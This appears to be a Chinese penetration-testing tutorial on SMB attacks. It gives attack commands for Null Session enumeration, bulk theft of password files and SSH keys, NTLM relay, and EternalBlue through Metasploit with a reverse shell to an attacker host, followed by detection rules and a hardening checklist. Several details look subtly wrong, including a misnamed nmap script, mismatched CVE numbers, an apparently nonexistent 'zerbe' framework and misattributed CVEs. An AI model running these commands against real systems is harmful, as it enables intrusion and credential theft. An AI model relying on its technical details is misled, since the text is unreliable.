---
title: "SMB 未授权访问 / EternalBlue (MS17-010) / 共享枚举 / 提权利用技术"
date: 2026-06-22T00:00:00+08:00
draft: false
weight: 103
description: "SMB 文件共享协议渗透测试：Null Session 未授权访问、共享枚举、命名管道攻击、EternalBlue (MS17-010) RCE、WannaCry 攻击链分析与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["SMB", "EternalBlue", "MS17-010", "Null Session", "共享枚举", "RCE", "WannaCry", "渗透测试"]
---

## 0x00 攻击面总览

SMB（Server Message Block）是文件共享协议，暴露多个高危攻击面：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| SMB (TCP) | 445 | TCP | 文件共享、IPC、命名管道 |
| SMB (NetBIOS) | 137-139 | TCP/UDP | 旧版 NetBIOS 协议 |
| SMB over QUIC | 443 | UDP | SMB over QUIC（新版） |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    SMB 攻击面                                   │
│                                                               │
│  ┌──────────────────────────────────────────────────────┐     │
│  │  SMB Server :445 (TCP)                                │     │
│  │  文件共享 / IPC$ / 命名管道                             │     │
│  └──────────────────────┬───────────────────────────────┘     │
│                         │                                     │
│  攻击路径：                                                    │
│  ① Null Session → 未授权访问 → 共享枚举/用户枚举               │
│  ② 共享访问 → 敏感文件窃取（SYSVOL/NETLOGON/C$/ADMIN$）        │
│  ③ 命名管道 → 服务交互 → 提权                                 │
│  ④ MS17-010 (EternalBlue) → SMBv1 远程代码执行                │
│  ⑤ SMB 签名禁用 → 中间人攻击 / NTLM 中继                      │
│                                                               │
│  默认风险：                                                    │
│  • Null Session 可能允许匿名访问                               │
│  • 管理共享（C$, ADMIN$）默认存在                              │
│  • SMBv1 可能未禁用（EternalBlue 风险）                        │
│  • SMB 签名可能未强制                                          │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 139,445 \
  --script=smb-os-discovery,smb-enum-shares,smb-enum-users \
  -oN smb_scan.txt <target>
```

**典型扫描结果**：

```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 10 microsoft-ds
```

### 1.2 版本指纹

```bash
# 获取 SMB 版本和操作系统信息
nmap -p 445 --script=smb-os-discovery target

# 响应示例
Host script results:
| smb-os-discovery:
|   OS: Windows 10 Pro 19041 (Windows 10 Pro 6.3)
|   Computer name: WORKSTATION
|   NetBIOS computer name: WORKSTATION
|   Domain name:
|   Forest name:
|   FQDN: WORKSTATION
|_  System time: 2026-06-21T00:00:00+08:00
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
port:445 smb
os:"Windows" port:445

# FOFA
port="445" && protocol="smb"
```

---

## 0x02 Null Session — 未授权访问

### 2.1 Null Session 连接

```bash
# 使用空凭据连接 IPC$
net use \\\\target\\IPC$ "" /u:""

# 使用 impacket
impacket-smbclient target -no-pass

# 使用 crackmapexec
crackmapexec smb target -u '' -p ''
```

### 2.2 共享枚举

```bash
# 列出所有共享
smbclient -L target -N

# 响应示例
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
Users           Disk

# 使用 enum4linux
enum4linux -a target
```

### 2.3 用户枚举

```bash
# 枚举用户
enum4linux -U target

# 响应示例
user[admin]
user[john]
user[sarah]

# 使用 ridenum
python ridenum.py target 500 50000

# 使用 impacket
impacket-lookupsid target@target
```

### 2.4 组枚举

```bash
# 枚举组
enum4linux -G target

# 枚举域组
enum4linux -r target
```

---

## 0x03 共享访问 — 数据窃取

### 3.1 高价值共享

```bash
# SYSVOL — 域策略和登录脚本
smbclient //target/SYSVOL -N
ls
get Policies/{GUID}/GptTmpl.inf

# NETLOGON — 登录脚本
smbclient //target/NETLOGON -N
ls

# C$ — 系统盘根目录（需要管理员凭据）
smbclient //target/C$ -U admin%password
ls

# ADMIN$ — Windows 目录（需要管理员凭据）
smbclient //target/ADMIN$ -U admin%password
ls
```

### 3.2 敏感文件搜索

```bash
# 搜索密码文件
smbclient //target/Users -N
recurse on
prompt off
mget *.txt *.doc *.xls *.pdf *.key *.pem *.conf

# 搜索配置文件
mget *password* *credential* *secret* *config*
```

### 3.3 使用 impacket 批量下载

```bash
# 使用 impacket-smbclient 批量操作
impacket-smbclient target@target -no-pass
# 在 smb 提示符下
use Users
get john/.ssh/id_rsa
get john/.bash_history
```

---

## 0x04 命名管道攻击

### 4.1 命名管道枚举

```bash
# 列出命名管道
impacket-samrdump target

# 响应示例
[+] PIPE: browser
[+] PIPE: lsarpc
[+] PIPE: netlogon
[+] PIPE: samr
[+] PIPE: srvsvc
[+] PIPE: winreg
[+] PIPE: wkssvc
```

### 4.2 命名管道利用

```bash
# 通过 samr 管道枚举用户
impacket-samrdump target

# 通过 lsarpc 管道枚举策略
impacket-lookupsid target@target

# 通过 srvsvc 管道枚举服务
impacket-services target status
```

---

## 0x05 MS17-010 (EternalBlue) — RCE

### 5.1 漏洞概述

| 属性 | 详情 |
|------|------|
| CVE | CVE-2017-0144 (MS17-010) |
| CVSS | 10.0（Critical） |
| 类型 | 远程代码执行 |
| 攻击向量 | SMBv1 (445) |
| 影响系统 | Windows Vista/7/8/8.1/10, Server 2008/2012/2016 |
| 根因 | SrvOs2FeaListToNt 整数溢出导致堆溢出 |
| 历史影响 | WannaCry 勒索软件、NotPetya |

### 5.2 漏洞检测

```bash
# 使用 nmap 检测 MS17-010
nmap -p 445 --script=smb-vuln-ms17-017 target

# 响应示例
Host script results:
| smb-vuln-ms17-017:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-017)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0147
|     Risk factor: HIGH
|_  Description: A critical remote code execution vulnerability exists in Microsoft SMBv1 servers.

# 使用 crackmapexec
crackmapexec smb target --gen-relay-list relay.txt
```

### 5.3 Metasploit 利用

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

### 5.4 独立 POC

```bash
# 使用 Python POC
python3 eternalblue_poc.py target 445

# 使用 zerbBe 框架
zerbe -t target -p 445 -a eternalblue
```

---

## 0x06 SMB 签名与 NTLM 中继

### 6.1 SMB 签名检查

```bash
# 检查 SMB 签名
nmap -p 445 --script=smb2-security-mode target

# 响应示例
Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

### 6.2 NTLM 中继攻击

```bash
# 使用 ntlmrelayx 进行中继
impacket-ntlmrelayx -smb2support -t target -socks

# 使用 Responder 捕获 NTLM
responder -I eth0 -dwP

# 中继到目标
impacket-ntlmrelayx -smb2support -t target2 -c "whoami"
```

---

## 0x07 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2017-0144 | RCE | 10.0 | EternalBlue SMBv1 RCE |
| CVE-2020-0796 | RCE | 9.8 | SMBGhost SMBv3 RCE |
| CVE-2020-1438 | RCE | 9.8 | SMB 签名绕过 |
| CVE-2019-1019 | 信息泄露 | 7.5 | SMB 信息泄露 |
| CVE-2018-0798 | RCE | 8.1 | SMB 后端 RCE |

**MS17-010 影响范围**：

Windows Vista/7/8/8.1/10, Server 2008/2012/2016。CVSS 10.0，无需认证。被 WannaCry 和 NotPetya 大规模利用。

---

## 0x08 蓝队检测方案

### 8.1 网络层检测

```yaml
title: SMB 外部访问检测
id: smb-external-access
status: experimental
description: 检测来自非内网段的 SMB 端口访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 139
      - 445
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 8.2 EternalBlue 检测

```yaml
title: MS17-010 EternalBlue 利用检测
id: smb-ms17-017-exploit
status: experimental
description: 检测 SMB MS17-017 EternalBlue 利用尝试
logsource:
  category: network
  service: smb
detection:
  selection_trans:
    payload|contains:
      - "\\PIPE\\browser"
      - "SrvOs2FeaListToNt"
  selection_shellcode:
    payload|contains:
      - "x86/shikata_ga_nai"
      - "x64/xor_dynamic"
  condition: selection_trans or selection_shellcode
level: critical
```

### 8.3 审计日志分析

```bash
# Windows 事件日志
# 4624 - 成功登录
# 4625 - 登录失败
# 5140 - 共享访问
# 5145 - 共享对象检查

# 监控 Null Session
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} |
  Where-Object {$_.Properties[8].Value -eq ''} |
  Select-Object TimeCreated, Message

# 监控 SMB 连接
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-SMBServer/Operational'} |
  Select-Object TimeCreated, Id, Message

# 监控异常共享访问
Get-WinEvent -FilterHashtable @{LogName='Security';Id=5140} |
  Where-Object {$_.Properties[3].Value -match 'ADMIN\$|C\$'} |
  Select-Object TimeCreated, Message
```

### 8.4 加固清单

```
[ ] 禁用 SMBv1：
    Set-SmbServerConfiguration -EnableSMB1Protocol $false
[ ] 强制 SMB 签名：
    Set-SmbServerConfiguration -RequireSecuritySignature $true
[ ] 禁用匿名访问（Null Session）：
    网络访问: 不允许 SAM 账户的匿名枚举
    网络访问: 限制匿名访问命名管道和共享
[ ] 禁用管理共享（如不需要）：
    注册表: HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
    AutoShareServer = 0
    AutoShareWks = 0
[ ] 防火墙限制 SMB 端口（139, 445）仅允许内网访问
[ ] 安装 MS17-010 补丁（所有 Windows 系统）
[ ] 安装 MS20-013 补丁（SMBGhost CVE-2020-0796）
[ ] 启用 SMB 审计日志
[ ] 部署 NTLM 中继防护（LDAP 签名、EPW）
[ ] 使用 GPO 限制 SMB 访问
[ ] 监控异常共享访问和 Null Session
[ ] 定期审查共享权限
[ ] 启用 Windows Defender Credential Guard
[ ] 将安全日志接入 SIEM
```

---

## 0x09 渗透测试检查清单

```
[ ] 端口扫描：139, 445
[ ] SMB 版本检测
[ ] Null Session 未授权访问测试
[ ] 共享枚举（smbclient -L / enum4linux）
[ ] 用户枚举（enum4linux -U / lookupsid）
[ ] 组枚举（enum4linux -G）
[ ] 命名管道枚举
[ ] 高价值共享访问测试（SYSVOL/NETLOGON/C$/ADMIN$）
[ ] 敏感文件搜索
[ ] MS17-010 (EternalBlue) 漏洞检测
[ ] MS17-010 RCE 利用测试
[ ] SMB 签名检查
[ ] NTLM 中继攻击测试
[ ] SMBGhost (CVE-2020-0796) 检测
[ ] 匿名访问配置检查
[ ] SMBv1 禁用状态检查
```

---

## 0x10 小结

SMB 的攻击面以 **Null Session 未授权访问** 和 **EternalBlue (MS17-010)** 为核心。Null Session 允许攻击者枚举共享、用户、组和命名管道，进而访问 SYSVOL/NETLOGON 等敏感共享窃取域凭据。**CVE-2017-0144 (MS17-010)** 是 SMBv1 中的远程代码执行漏洞（CVSS 10.0），被 WannaCry 和 NotPetya 大规模利用。SMB 签名未强制时还面临 NTLM 中继攻击风险。蓝队应重点关注：禁用 SMBv1、强制 SMB 签名、禁用 Null Session、安装补丁、限制网络访问、将审计日志接入 SIEM。
